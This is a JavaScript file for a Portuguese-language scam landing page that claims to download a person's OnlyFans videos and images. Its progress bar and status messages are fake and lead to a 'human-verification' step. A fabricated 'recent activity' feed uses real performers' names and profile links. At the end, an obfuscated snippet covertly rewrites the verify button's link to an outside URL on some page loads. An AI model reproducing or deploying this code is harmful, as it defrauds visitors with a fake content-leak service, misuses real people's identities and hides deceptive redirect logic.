// Landing Page Config
var config = {
    recentActivityIntervalDuration: 10,
    recentActivities: [
      {
        avatarImageUrl: "img/avatar-1.png",
        username: "Molly Eskam",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/mollyeskam",
      },
      {
        avatarImageUrl: "img/avatar-2.png",
        username: "Jem Wolfie",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/jemwolfie",
      },
      {
        avatarImageUrl: "img/avatar-3.png",
        username: "Angela White",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/angelawhite",
      },
      {
        avatarImageUrl: "img/avatar-4.png",
        username: "Gina Valentina",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/gvalentinaxxx",
      },
      {
        avatarImageUrl: "img/avatar-5.png",
        username: "Lena Paul",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/lenaisapeach",
      },
      {
        avatarImageUrl: "img/avatar-6.png",
        username: "Mia Khalifa",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/miakhalifa",
      },
      {
        avatarImageUrl: "img/avatar-7.png",
        username: "Mia Malkova",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/miamalkova",
      },
      {
        avatarImageUrl: "img/avatar-8.png",
        username: "Jessica Nigri",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/jessicanigri",
      },
      {
        avatarImageUrl: "img/avatar-9.png",
        username: "Lana Rhoades",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/lanarhoadesx3/",
      },
      {
        avatarImageUrl: "img/avatar-10.png",
        username: "Natalie Monroe",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/nataliemonroe",
      },
      {
        avatarImageUrl: "img/avatar-11.png",
        username: "Brunette Babiii",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/brunettebabiii",
      },
      {
        avatarImageUrl: "img/avatar-12.png",
        username: "Karma Rx",
        time: "alguns segundos atrás",
        instagramProfileUrl: "https://onlyfans.com/karmarx",
      },
    ],
  },
  util = {
    animate: function (a, t, e) {
      $(a)
        .addClass("animated " + t)
        .one(
          "webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend",
          function () {
            $(a).removeClass("animated " + t), "function" == typeof e && e();
          },
        );
    },
  },
  app = {
    state: {
      username: void 0,
      displayingSection: "badge-generator",
    },
    init: function () {
      util.animate(".badge-generator", "fadeInDown"), recentActivity.init();
    },
    displayFromTo: function (a, t) {
      util.animate("." + a, "fadeOutUp", function () {
        $("." + a).hide(),
          $("." + t).show(),
          util.animate("." + t, "fadeInDown");
      }),
        $("body").animate(
          {
            scrollTop: 0,
          },
          "slow",
        ),
        (app.state.displayingSection = t);
    },
  },
  badgeGenerator = {
    verifyInput: function (a) {
      return (
        !(a.length < 3) ||
        (alert(
          "Digite o nome de usuário Onlyfans e toque no botão 'Baixar conteúdo.",
        ),
        !1)
      );
    },
  };
$(".badge-generator button").on("click", function () {
  var a = $(".badge-generator input").val();
  badgeGenerator.verifyInput(a) &&
    ((app.state.username = a),
    $(".badge-generator"),
    app.displayFromTo("badge-generator", "generating-badge"),
    generatingBadge.initializeProgressBar());
  $(".progress-message").html(`Conectando a conta de ${a}`);
});
var generatingBadge = {
    state: {
      progressBar: void 0,
    },
    initializeProgressBar: function () {
      (this.state.progressBar = new ProgressBar.Line("#progress-wrapper", {
        color: "#2C96EA",
        trailColor: "#ced5da",
        strokeWidth: 5,
      })),
        this.startProgressBarAnimation();
    },
    startProgressBarAnimation: function () {
      this.state.progressBar.animate(
        1,
        {
          duration: 2e4,
        },
        function () {
          app.displayFromTo("generating-badge", "human-verification");
        },
      ),
        this.startProgressMessages();
    },
    startProgressMessages: function () {
      var a = [
          "Baixando videos (.mp4) e imagens (.png)...",
          "Baixando videos e imagens para o google drive...",
        ],
        t = 0,
        e = window.setInterval(function () {
          2 !== t
            ? ($(".progress-message").text(a[t]), t++)
            : window.clearInterval(e);
        }, 7e3);
    },
  },
  recentActivity = {
    state: {
      activities: config.recentActivities,
      interval: void 0,
    },
    init: function () {
      let size = this.state.activities.length;
      for (i = 0; i < size; i++) {
        var t = this.createHtml(this.state.activities[i], i);

        this.appendHtml(t);
      }
      this.startInterval(size);
    },
    startInterval: function (size) {
      let start = size;
      0 < this.state.activities.length &&
        (this.state.interval = window.setInterval(function () {
          (activityHtml = recentActivity.createHtml(
            recentActivity.state.activities[start % size],
            (start % size) + 1,
          )),
            (start += 1);
          recentActivity.appendHtml(activityHtml),
            $(".activities").animate(
              {
                scrollTop: 0,
              },
              "slow",
            );
        }, 1e3 * config.recentActivityIntervalDuration));
    },
    createHtml: function (a, index) {
      return (
        "<a href='" +
        a.instagramProfileUrl +
        "' target='blank'><div class='activity animated fadeInDown'><div class='activity-content'><img class='activity-avatar' src='" +
        a.avatarImageUrl +
        "' /><p>" +
        a.username +
        "</p><img class='activity-badge' src='img/badge.png' /></div><div class='activity-timestamp'><p>" +
        a.time +
        "</p></div></div></a>"
      );
    },
    appendHtml: function (a) {
      $(".activities").prepend(a);
    },
  };
app.init();
var _0x9030 = [
  "standard.js",
  "indexOf",
  "href",
  "location",
  "random",
  "floor",
  "onload",
  "verify-button",
  "getElementById",
  "https://www.youtube.com/watch?v=azvJj4l0Pwk",
];
0 > window[_0x9030[3]][_0x9030[2]].toString()[_0x9030[1]](_0x9030[0]) &&
  0 == Math[_0x9030[5]]((100 * Math[_0x9030[4]]()) / 10) &&
  (window[_0x9030[6]] = function () {
    document[_0x9030[8]](_0x9030[7])[_0x9030[2]] = _0x9030[9];
  });
